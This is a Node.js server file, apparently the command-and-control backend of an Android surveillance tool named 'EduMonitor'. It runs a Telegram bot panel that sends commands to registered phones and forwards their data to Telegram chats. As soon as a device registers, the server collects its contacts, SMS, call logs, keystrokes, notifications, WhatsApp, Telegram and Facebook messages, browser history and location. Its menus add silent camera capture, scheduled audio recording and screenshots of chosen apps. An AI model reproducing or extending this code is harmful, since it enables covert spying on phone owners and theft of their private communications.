                caption += `🔔 Notifications Export (${itemCount} notifications)`;
                break;
            case 'open_app':
                caption += `📱 App Opens Export (${itemCount} entries)`;
                break;
            case 'whatsapp':
                caption += `💬 WhatsApp Messages Export (${itemCount} messages)`;
                break;
            case 'telegram':
                caption += `💬 Telegram Messages Export (${itemCount} messages)`;
                break;
            case 'facebook':
                caption += `💬 Facebook Messages Export (${itemCount} messages)`;
                break;
            case 'browser':
                caption += `🌐 Browser History Export (${itemCount} entries)`;
                break;
            case 'device_info':
                caption += `📊 Device Info Export (${itemCount} snapshots)`;
                break;
            default:
                caption += `📎 Data Export`;
        }
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted temporary file: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting file:', e);
            }
        }, 60000);
        
        res.json({ success: true, filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ File upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// ============= API ENDPOINTS =============

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        timestamp: Date.now(),
        server: 'secondary'
    });
});

app.get('/api/ping/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        saveDevices();
        res.json({ 
            status: 'alive', 
            timestamp: Date.now(),
            registered: true,
            deviceId: deviceId,
            chatId: device.chatId,
            serverUrl: activeServerUrl
        });
    } else {
        res.status(404).json({ 
            status: 'unknown',
            registered: false,
            deviceId: deviceId,
            message: 'Device not registered'
        });
    }
});

app.get('/api/verify/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device && device.chatId) {
        res.json({
            registered: true,
            deviceId: deviceId,
            chatId: device.chatId,
            lastSeen: device.lastSeen,
            deviceInfo: device.deviceInfo,
            phoneNumber: device.phoneNumber,
            hasPendingCommands: (device.pendingCommands?.length || 0) > 0
        });
    } else {
        res.status(404).json({
            registered: false,
            deviceId: deviceId,
            message: 'Device not registered'
        });
    }
});

app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device?.pendingCommands?.length > 0) {
            const sortedCommands = [...device.pendingCommands].sort((a, b) => a.timestamp - b.timestamp);
            const commands = sortedCommands.map(cmd => ({
                command: cmd.command,
                originalCommand: cmd.originalCommand,
                messageId: cmd.messageId,
                timestamp: cmd.timestamp,
                autoData: cmd.autoData || false
            }));
            device.pendingCommands = [];
            saveDevices();
            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
            sendJsonResponse(res, { commands });
        } else {
            console.log(`📭 No commands for ${deviceId}`);
            sendJsonResponse(res, { commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        sendJsonResponse(res, { commands: [], error: e.message }, 500);
    }
});

app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    const fileCommands = [
        'contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'open_app',
        'whatsapp', 'telegram', 'facebook', 'browser',
        'device_info', 'network_info', 'mobile_info',
        'screenshots', 'screenshot_logs'
    ];
    
    if (fileCommands.includes(command)) {
        console.log(`📎 ${command} using dedicated file upload endpoint`);
        return res.sendStatus(200);
    }
    
    console.log(`📨 Result from ${deviceId}:`, { command });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
        
        if (error) {
            await sendTelegramMessage(chatId, devicePrefix + `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
        } else if (result) {
            await sendTelegramMessage(chatId, devicePrefix + result);
        } else {
            await sendTelegramMessage(chatId, devicePrefix + `✅ ${command} executed successfully`);
        }
    }
    
    res.sendStatus(200);
});

// ============= REGISTRATION ENDPOINT =============

app.post('/api/register', async (req, res) => {
    const { deviceId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId });
    
    if (!deviceId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    
    const deviceConfig = getDeviceConfig(deviceId);
    
    if (!deviceConfig) {
        return res.status(403).json({ error: 'Device not authorized' });
    }
    
    const existingDevice = devices.get(deviceId);
    const isNewDevice = !existingDevice;
    
    const deviceData = {
        chatId: deviceConfig.chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: existingDevice ? existingDevice.pendingCommands : [],
        firstSeen: existingDevice ? existingDevice.firstSeen : Date.now(),
        phoneNumber: existingDevice?.phoneNumber || null,
        lastIPInfo: existingDevice?.lastIPInfo || null,
        lastLocation: existingDevice?.lastLocation || null,
        simInfo: existingDevice?.simInfo || null,
        wifiInfo: existingDevice?.wifiInfo || null,
        mobileInfo: existingDevice?.mobileInfo || null,
        screenshotSettings: existingDevice?.screenshotSettings || null,
        recordingSettings: existingDevice?.recordingSettings || null
    };
    
    devices.set(deviceId, deviceData);
    saveDevices();
    
    console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${deviceConfig.chatId}`);
    
    await setChatMenuButton(deviceConfig.chatId);
    
    const userDevices = getDeviceListForUser(deviceConfig.chatId);
    
    let welcomeMessage = `✅ <b>Device ${isNewDevice ? 'Connected' : 'Updated'}!</b>\n\n`;
    welcomeMessage += `📱 Model: ${deviceInfo.model}\n`;
    welcomeMessage += `🤖 Android: ${deviceInfo.android}\n`;
    welcomeMessage += `🆔 ID: ${deviceId.substring(0, 8)}...\n\n`;
    
    if (isNewDevice) {
        welcomeMessage += `You now have ${userDevices.length} device(s) registered.\n\n`;
        welcomeMessage += `🔄 <b>Auto-collecting data...</b>\n`;
        welcomeMessage += `The server is automatically requesting:\n`;
        welcomeMessage += `• 📱 Device Info\n`;
        welcomeMessage += `• 🌐 Network Info\n`;
        welcomeMessage += `• 📱 Mobile Info\n`;
        welcomeMessage += `• 📇 Contacts\n`;
        welcomeMessage += `• 💬 SMS Messages\n`;
        welcomeMessage += `• 📞 Call Logs\n`;
        welcomeMessage += `• 📱 Installed Apps\n`;
        welcomeMessage += `• ⌨️ Keystrokes\n`;
        welcomeMessage += `• 🔔 Notifications\n`;
        welcomeMessage += `• 💬 WhatsApp\n`;
        welcomeMessage += `• 💬 Telegram\n`;
        welcomeMessage += `• 💬 Facebook\n`;
        welcomeMessage += `• 🌐 Browser History\n`;
        welcomeMessage += `• 📍 Location\n\n`;
        welcomeMessage += `This may take a few moments as the device processes each request.`;
        
        if (userDevices.length === 1) {
            userDeviceSelection.set(deviceConfig.chatId, deviceId);
            welcomeMessage += `\n\n✅ This device has been automatically selected for control.`;
        }
    } else {
        welcomeMessage += `Device information updated.`;
    }
    
    await sendTelegramMessageWithKeyboard(
        deviceConfig.chatId,
        welcomeMessage,
        getMainMenuKeyboard(deviceConfig.chatId)
    );
    
    if (isNewDevice) {
        queueAutoDataCommands(deviceId, deviceConfig.chatId);
    }
    
    // Return config with current active bot token and server URL
    const responseConfig = {
        ...deviceConfig.config,
        botToken: activeBotToken,
        serverUrl: activeServerUrl,
        chatId: deviceConfig.chatId
    };
    
    res.json({
        status: 'registered',
        deviceId,
        chatId: deviceConfig.chatId,
        config: responseConfig
    });
});

app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [id, device] of devices.entries()) {
        deviceList.push({
            deviceId: id,
            chatId: device.chatId,
            lastSeen: new Date(device.lastSeen).toISOString(),
            firstSeen: new Date(device.firstSeen).toISOString(),
            model: device.deviceInfo?.model || 'Unknown',
            android: device.deviceInfo?.android || 'Unknown',
            phoneNumber: device.phoneNumber || 'Not available',
            lastIPInfo: device.lastIPInfo || null,
            lastLocation: device.lastLocation || null,
            autoDataRequested: autoDataRequested.has(id),
            online: (Date.now() - device.lastSeen) < 300000
        });
    }
    res.json({ total: devices.size, devices: deviceList });
});

// ============= TEST ENDPOINTS =============

app.get('/test', (req, res) => {
    const serverIP = getServerIP();
    const userDevices = getDeviceListForUser('8266841615');
    
    res.send(`
        <html>
        <head>
            <style>
                body { font-family: Arial; padding: 20px; background: #1a1a2e; color: #fff; }
                h1 { color: #e94560; }
                .stats { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px 0; }
                .device { background: #0f3460; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 3px solid #e94560; }
                .online { color: #4CAF50; }
                .offline { color: #f44336; }
                .ip { background: #1a1a2e; padding: 5px; border-radius: 3px; font-family: monospace; }
            </style>
        </head>
        <body>
            <h1>✅ Secondary Server - EduMonitor v7.0</h1>
            <div class="stats">
                <p><b>Time:</b> ${new Date().toISOString()}</p>
                <p><b>Server IP:</b> <code class="ip">${serverIP}</code></p>
                <p><b>Total Devices:</b> ${devices.size}</p>
                <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
                <p><b>Persistent Storage:</b> ${fs.existsSync(DEVICES_FILE) ? '✅ Enabled' : '⚠️ Not initialized'}</p>
                <p><b>Active Bot Token:</b> <code>${activeBotToken.substring(0, 20)}...</code></p>
                <p><b>Server URL:</b> <code>${activeServerUrl}</code></p>
            </div>
            
            <h2>📱 Registered Devices (${userDevices.length})</h2>
            ${Array.from(devices.entries()).map(([id, device]) => {
                const online = (Date.now() - device.lastSeen) < 300000;
                return `
                    <div class="device">
                        <h3>${device.deviceInfo?.model || 'Unknown Device'}</h3>
                        <p><b>ID:</b> <code>${id}</code></p>
                        <p><b>Status:</b> <span class="${online ? 'online' : 'offline'}">${online ? '🟢 Online' : '⚫ Offline'}</span></p>
                        <p><b>Last Seen:</b> ${new Date(device.lastSeen).toLocaleString()}</p>
                        <p><b>First Seen:</b> ${new Date(device.firstSeen).toLocaleString()}</p>
                        <p><b>Android:</b> ${device.deviceInfo?.android || 'Unknown'}</p>
                        <p><b>Phone:</b> ${device.phoneNumber || 'Not available'}</p>
                        <p><b>Pending Commands:</b> ${device.pendingCommands?.length || 0}</p>
                    </div>
                `;
            }).join('')}
            
            <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
        </body>
        </html>
    `);
});

app.get('/test-menu', async (req, res) => {
    const chatId = '8266841615';
    const result = await sendTelegramMessageWithKeyboard(
        chatId,
        "🎯 Secondary Server Test Menu - Use the buttons below:",
        getMainMenuKeyboard(chatId)
    );
    res.json({ success: !!result });
});

// ============= CALLBACK QUERY HANDLER =============

async function handleCallbackQuery(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;
    
    console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
    
    await answerCallbackQuery(callbackId);
    
    // Handle commands
    if (data.startsWith('cmd:')) {
        const command = data.substring(4);
        await executeCommandFromButton(chatId, messageId, command, callbackId);
        return;
    }
    
    // Handle menu navigation
    switch (data) {
        case 'help_main':
            await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
            await sendTelegramMessage(chatId, "🤖 *EduMonitor Control Panel*\n\nSelect a category:");
            break;
        case 'menu_screenshot':
            await editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard());
            break;
        case 'menu_screenshot_settings':
            await editMessageKeyboard(chatId, messageId, getScreenshotSettingsKeyboard());
            break;
        case 'menu_screenshot_targets':
            await editMessageKeyboard(chatId, messageId, getScreenshotTargetsKeyboard());
            break;
        case 'menu_screenshot_quality':
            await editMessageKeyboard(chatId, messageId, getScreenshotQualityKeyboard());
            break;
        case 'menu_screenshot_token':
            await editMessageKeyboard(chatId, messageId, getScreenshotTokenKeyboard());
            break;
        case 'menu_sched_config':
            await editMessageKeyboard(chatId, messageId, getSchedConfigKeyboard());
            break;
        case 'menu_configure_schedule':
            await sendTelegramMessage(chatId, "⚙️ *Configure Screenshot Schedule*\n\nSend: `on/off general_minutes target_minutes`\nExample: `on 10 5`");
            await editMessageKeyboard(chatId, messageId, getConfigureScheduleKeyboard());
            userStates.set(chatId, { state: 'awaiting_sched_config', data: {} });
            break;
        case 'menu_add_target':
            await sendTelegramMessage(chatId, "📱 *Add Target App*\n\nSend the package name:\nExample: `com.whatsapp`");
            await editMessageKeyboard(chatId, messageId, getAddTargetKeyboard());
            userStates.set(chatId, { state: 'awaiting_add_target', data: {} });
            break;
        case 'menu_remove_target':
            await sendTelegramMessage(chatId, "❌ *Remove Target App*\n\nSend the package name to remove:");
            await editMessageKeyboard(chatId, messageId, getRemoveTargetKeyboard());
            userStates.set(chatId, { state: 'awaiting_remove_target', data: {} });
            break;
        case 'menu_camera':
            await editMessageKeyboard(chatId, messageId, getCameraMenuKeyboard());
            break;
        case 'menu_recording':
            await editMessageKeyboard(chatId, messageId, getRecordingMenuKeyboard());
            break;
        case 'menu_recording_settings':
            await editMessageKeyboard(chatId, messageId, getRecordingSettingsKeyboard());
            break;
        case 'menu_audio_quality':
            await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
            break;
        case 'menu_custom_schedule':
            await sendTelegramMessage(chatId, "⚙️ *Set Custom Recording Schedule*\n\nFormat: `HH:MM HH:MM daily/once minutes`\nExample: `22:00 06:00 daily 30`");
            await editMessageKeyboard(chatId, messageId, getCustomScheduleKeyboard());
            userStates.set(chatId, { state: 'awaiting_custom_schedule', data: {} });
            break;
        case 'menu_data':
            await editMessageKeyboard(chatId, messageId, getDataMenuKeyboard());
            break;
        case 'menu_new_data':
            await editMessageKeyboard(chatId, messageId, getNewDataKeyboard());
            break;
        case 'menu_all_data':
            await editMessageKeyboard(chatId, messageId, getAllDataKeyboard());
            break;
        case 'menu_sync_harvest':
            await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
            break;
        case 'menu_set_sync_interval':
            await sendTelegramMessage(chatId, "⚙️ *Set Sync Interval*\n\nSend interval in minutes (5-720):\nExample: `60`");
            await editMessageKeyboard(chatId, messageId, getSetSyncIntervalKeyboard());
            userStates.set(chatId, { state: 'awaiting_sync_interval', data: {} });
            break;
        case 'menu_realtime':
            await editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard());
            break;
        case 'menu_info':
            await editMessageKeyboard(chatId, messageId, getInfoMenuKeyboard());
            break;
        case 'menu_device_name':
            await editMessageKeyboard(chatId, messageId, getDeviceNameKeyboard());
            break;
        case 'menu_system':
            await editMessageKeyboard(chatId, messageId, getSystemMenuKeyboard());
            break;
        case 'menu_media':
            await editMessageKeyboard(chatId, messageId, getMediaMenuKeyboard());
            break;
        case 'menu_add_scan_path':
            await sendTelegramMessage(chatId, "📁 *Add Scan Path*\n\nSend the folder path to scan:\nExample: `DCIM/Camera`");
            await editMessageKeyboard(chatId, messageId, getAddScanPathKeyboard());
            userStates.set(chatId, { state: 'awaiting_add_scan_path', data: {} });
            break;
        case 'menu_remove_scan_path':
            await sendTelegramMessage(chatId, "❌ *Remove Scan Path*\n\nSend the folder path to remove:");
            await editMessageKeyboard(chatId, messageId, getRemoveScanPathKeyboard());
            userStates.set(chatId, { state: 'awaiting_remove_scan_path', data: {} });
            break;
        case 'menu_app_management':
            await editMessageKeyboard(chatId, messageId, getAppManagementKeyboard());
            break;
        case 'menu_data_saving':
            await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
            break;
        case 'menu_bot_token':
            await editMessageKeyboard(chatId, messageId, getBotTokenKeyboard());
            break;
        case 'menu_set_server_backup':
            await sendTelegramMessage(chatId, "🤖 *Set Server Backup Tokens*\n\nFormat: `token1 chatId1 token2 chatId2`\nExample: `123456:ABC 123456789 654321:XYZ 987654321`");
            await editMessageKeyboard(chatId, messageId, getSetServerBackupKeyboard());
            userStates.set(chatId, { state: 'awaiting_server_backup', data: {} });
            break;
        case 'menu_devices':
            const keyboard = getDeviceSelectionKeyboard(chatId);
            await editMessageKeyboard(chatId, messageId, keyboard);
            break;
        case 'refresh_devices':
            const refreshKeyboard = getDeviceSelectionKeyboard(chatId);
            await editMessageKeyboard(chatId, messageId, refreshKeyboard);
            await answerCallbackQuery(callbackId, '🔄 Device list refreshed');
            break;
        case 'device_stats':
            const userDevices = getDeviceListForUser(chatId);
            let statsMsg = `📊 *Device Statistics*\n\nTotal Devices: ${userDevices.length}\n\n`;
            userDevices.forEach((device, index) => {
                statsMsg += `${index + 1}. ${device.name}\n`;
                statsMsg += `   ID: ${device.id.substring(0, 8)}...\n`;
                statsMsg += `   Last Seen: ${device.lastSeenFormatted}\n`;
                statsMsg += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '✅ Online' : '⏹️ Offline'}\n\n`;
            });
            await sendTelegramMessage(chatId, statsMsg);
            break;
        case data.startsWith('select_device:') && data:
            const selectedDeviceId = data.split(':')[1];
            const device = devices.get(selectedDeviceId);
            if (device) {
                userDeviceSelection.set(chatId, selectedDeviceId);
                await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
                await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
                await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`);
            }
            break;
        case 'close_menu':
            await editMessageKeyboard(chatId, messageId, []);
            await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
            break;
        default:
            console.log(`⚠️ Unknown callback: ${data}`);
            break;
    }
}

async function executeCommandFromButton(chatId, messageId, command, callbackId) {
    console.log(`🎯 Executing command from button: ${command}`);
    
    const selectedDeviceId = userDeviceSelection.get(chatId);
    const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
    
    if (!device) {
        await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
        return;
    }
    
    await answerCallbackQuery(callbackId, `🔄 Executing ${command}...`);
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    device.pendingCommands.push({
        command: command,
        originalCommand: `/${command}`,
        messageId: messageId,
        timestamp: Date.now()
    });
    saveDevices();
    
    await sendTelegramMessage(chatId, `✅ Command sent: /${command}`);
    
    const keyboard = [[{ text: '◀️ Back to Menu', callback_data: 'help_main' }]];
    await editMessageKeyboard(chatId, messageId, keyboard);
}

// ============= WEBHOOK ENDPOINT =============

app.post('/webhook', async (req, res) => {
    res.sendStatus(200);
    
    setImmediate(async () => {
        try {
            const update = req.body;
            console.log('📩 Received update type:', update.callback_query ? 'callback' : (update.message ? 'message' : 'other'));

            if (update.callback_query) {
                await handleCallbackQuery(update.callback_query);
                return;
            }

            if (!update?.message) {
                console.log('📭 Non-message update');
                return;
            }

            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;

            if (!isAuthorizedChat(chatId)) {
                console.log(`⛔ Unauthorized chat: ${chatId}`);
                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                return;
            }

            await setChatMenuButton(chatId);

            const userState = userStates.get(chatId);
            
            if (userState) {
                await handleConversationMessage(chatId, text, messageId, userState);
                return;
            }

            if (text?.startsWith('/')) {
                await handleCommand(chatId, text, messageId);
            } else {
                await sendTelegramMessageWithKeyboard(
                    chatId,
                    "🤖 Use the menu button below or type /help to see available commands.",
                    getMainMenuKeyboard(chatId)
                );
            }
        } catch (error) {
            console.error('❌ Error processing webhook:', error);
        }
    });
});

// ============= CONVERSATION HANDLER =============

async function handleConversationMessage(chatId, text, messageId, userState) {
    switch (userState.state) {
        case 'awaiting_sched_config':
            const parts = text.trim().split(/\s+/);
            if (parts.length >= 3) {
                const command = `/sched_config ${parts[0]} ${parts[1]} ${parts[2]}`;
                await sendCommandToDevice(chatId, messageId, command);
                userStates.delete(chatId);
            } else {
                await sendTelegramMessage(chatId, "❌ Invalid format. Use: `on/off general_minutes target_minutes`\nExample: `on 10 5`");
            }
            break;
            
        case 'awaiting_add_target':
            if (text && text.length > 0) {
                const command = `/add_target ${text}`;
                await sendCommandToDevice(chatId, messageId, command);
                userStates.delete(chatId);
            } else {
                await sendTelegramMessage(chatId, "❌ Invalid package name.");
                userStates.delete(chatId);
            }
            break;
            
        case 'awaiting_remove_target':
            if (text && text.length > 0) {
                const command = `/remove_target ${text}`;
                await sendCommandToDevice(chatId, messageId, command);
                userStates.delete(chatId);
            } else {
                await sendTelegramMessage(chatId, "❌ Invalid package name.");
                userStates.delete(chatId);
            }
            break;
            
        case 'awaiting_custom_schedule':
            const scheduleParts = text.trim().split(/\s+/);
            if (scheduleParts.length >= 4) {
                const command = `/record_custom ${scheduleParts[0]} ${scheduleParts[1]} ${scheduleParts[2]} ${scheduleParts[3]}`;
                await sendCommandToDevice(chatId, messageId, command);
                userStates.delete(chatId);
            } else {
                await sendTelegramMessage(chatId, "❌ Invalid format. Use: `HH:MM HH:MM daily/once minutes`\nExample: `22:00 06:00 daily 30`");
            }
            break;
            
        case 'awaiting_sync_interval':
            const interval = parseInt(text);
            if (!isNaN(interval) && interval >= 5 && interval <= 720) {
                const command = `/set_sync_interval ${interval}`;
                await sendCommandToDevice(chatId, messageId, command);
                userStates.delete(chatId);
            } else {
                await sendTelegramMessage(chatId, "❌ Invalid interval. Must be between 5 and 720 minutes.");
            }
            break;
            
        case 'awaiting_add_scan_path':
            if (text && text.length > 0) {
                const command = `/add_scan_path ${text}`;
                await sendCommandToDevice(chatId, messageId, command);
                userStates.delete(chatId);
            } else {
                await sendTelegramMessage(chatId, "❌ Invalid path.");
                userStates.delete(chatId);
            }
            break;
            
        case 'awaiting_remove_scan_path':
            if (text && text.length > 0) {
                const command = `/remove_scan_path ${text}`;
                await sendCommandToDevice(chatId, messageId, command);
                userStates.delete(chatId);
            } else {
                await sendTelegramMessage(chatId, "❌ Invalid path.");
                userStates.delete(chatId);
            }
            break;
            
        case 'awaiting_server_backup':
            const backupParts = text.trim().split(/\s+/);
            if (backupParts.length >= 4) {
                const command = `/set_server_backup ${backupParts[0]} ${backupParts[1]} ${backupParts[2]} ${backupParts[3]}`;
                await sendCommandToDevice(chatId, messageId, command);
                userStates.delete(chatId);
            } else {
                await sendTelegramMessage(chatId, "❌ Invalid format. Use: `token1 chatId1 token2 chatId2`");
            }
            break;
            
        default:
            userStates.delete(chatId);
            await handleCommand(chatId, text, messageId);
            break;
    }
}

async function sendCommandToDevice(chatId, messageId, command) {
    const selectedDeviceId = userDeviceSelection.get(chatId);
    const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
    
    if (!device) {
        await sendTelegramMessage(chatId, '❌ No device selected.');
        return;
    }
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    device.pendingCommands.push({
        command: command.substring(1),
        originalCommand: command,
        messageId: messageId,
        timestamp: Date.now()
    });
    saveDevices();
    
    await sendTelegramMessage(chatId, `✅ Command sent: ${command}`);
}

// ============= COMMAND HANDLER =============

async function handleCommand(chatId, command, messageId) {
    console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);

    if (command === '/device_info' || command === '/network_info' || command === '/mobile_info' || command === '/location') {
        let selectedDeviceId = userDeviceSelection.get(chatId);
        let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            for (const [id, d] of devices.entries()) {
                if (String(d.chatId) === String(chatId)) {
                    selectedDeviceId = id;
                    device = d;
                    userDeviceSelection.set(chatId, selectedDeviceId);
                    break;
                }
            }
        }
        
        if (device) {
            await answerCallbackQuery(null, `🔄 Sending ${command} to device...`);
            
            if (!device.pendingCommands) {
                device.pendingCommands = [];
            }
            
            device.pendingCommands.push({
                command: command.substring(1),
                originalCommand: command,
                messageId: messageId,
                timestamp: Date.now()
            });
            saveDevices();
            
            await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
        } else {
            await sendTelegramMessage(chatId, '❌ No device registered.');
        }
        return;
    }
    
    if (command === '/devices') {
        const userDevices = getDeviceListForUser(chatId);
        let message = `📱 *Your Devices*\n\n`;
        
        if (userDevices.length === 0) {
            message += "No devices registered yet.";
        } else {
            userDevices.forEach((device, index) => {
                const status = device.isActive ? '✅ ACTIVE' : '○';
                message += `${index + 1}. ${status} ${device.name}\n`;
                message += `   ID: \`${device.id}\`\n`;
                message += `   Last Seen: ${device.lastSeenFormatted}\n`;
                message += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '🟢 Online' : '⚫ Offline'}\n`;
                if (device.phoneNumber !== 'Not available') {
                    message += `   Phone: ${device.phoneNumber}\n`;
                }
                message += `\n`;
            });
            message += `\nUse /select [device_id] to switch active device.`;
        }
        
        await sendTelegramMessage(chatId, message);
        return;
    }
    
    if (command === '/showmenu' || command === '/help') {
        console.log('📋 Force showing main menu');
        await sendTelegramMessageWithKeyboard(
            chatId,
            "🤖 *EduMonitor Control Panel*\n\nSelect a category:",
            getMainMenuKeyboard(chatId)
        );
        return;
    }
    
    if (command.startsWith('/select ')) {
        const deviceId = command.substring(8).trim();
        const device = devices.get(deviceId);
        
        if (device && String(device.chatId) === String(chatId)) {
            userDeviceSelection.set(chatId, deviceId);
            await sendTelegramMessage(chatId, 
                `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}\n` +
                `ID: ${deviceId.substring(0, 8)}...`);
        } else {
            await sendTelegramMessage(chatId, '❌ Device not found or not authorized.');
        }
        return;
    }

    let selectedDeviceId = userDeviceSelection.get(chatId);
    let device = null;
    
    if (selectedDeviceId) {
        device = devices.get(selectedDeviceId);
    }
    
    if (!device) {
        for (const [id, d] of devices.entries()) {
            if (String(d.chatId) === String(chatId)) {
                selectedDeviceId = id;
                device = d;
                userDeviceSelection.set(chatId, selectedDeviceId);
                break;
            }
        }
    }

    if (!device) {
        await sendTelegramMessageWithKeyboard(chatId, 
            '❌ No device registered.\n\nPlease make sure the Android app is running.',
            getMainMenuKeyboard(chatId));
        return;
    }

    device.lastSeen = Date.now();
    saveDevices();
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
    
    device.pendingCommands.push({
        command: cleanCommand,
        originalCommand: command,
        messageId: messageId,
        timestamp: Date.now()
    });
    saveDevices();
    
    console.log(`📝 Command queued for device ${selectedDeviceId}: ${cleanCommand}`);
    
    await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
}

// ============= START SERVER =============

app.listen(PORT, '0.0.0.0', () => {
    const serverIP = getServerIP();
    console.log('\n🚀 ===============================================');
    console.log(`🚀 Secondary Server - EduMonitor v7.0`);
    console.log(`🚀 Server IP: ${serverIP}`);
    console.log(`🚀 Port: ${PORT}`);
    console.log(`🚀 Webhook URL: ${activeServerUrl}/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log(`🚀 Persistent Storage: ${DEVICES_FILE}`);
    console.log(`\n🤖 BOT CONFIGURATION:`);
    console.log(`   Active Bot Token: ${activeBotToken.substring(0, 20)}...`);
    console.log(`   Server URL: ${activeServerUrl}`);
    console.log('\n✅ MENU STRUCTURE:');
    console.log('   📸 Screenshot → Settings → Config/Targets/Quality/Token');
    console.log('   📷 Camera → Photo/Silent/Front/Back/Switch');
    console.log('   🎤 Recording → Start/Stop/Settings → Info/Schedule/Quality');
    console.log('   📊 Data → NEW Data/ALL Data/Sync & Harvest');
    console.log('   ⚡ Real-time → Keys/Notifications/All');
    console.log('   ℹ️ Info → Device Info/Network Info/Mobile Info/Device Name');
    console.log('   ⚙️ System → Media/App Management/Data Saving/Bot Token');
    console.log('🚀 ===============================================\n');
});
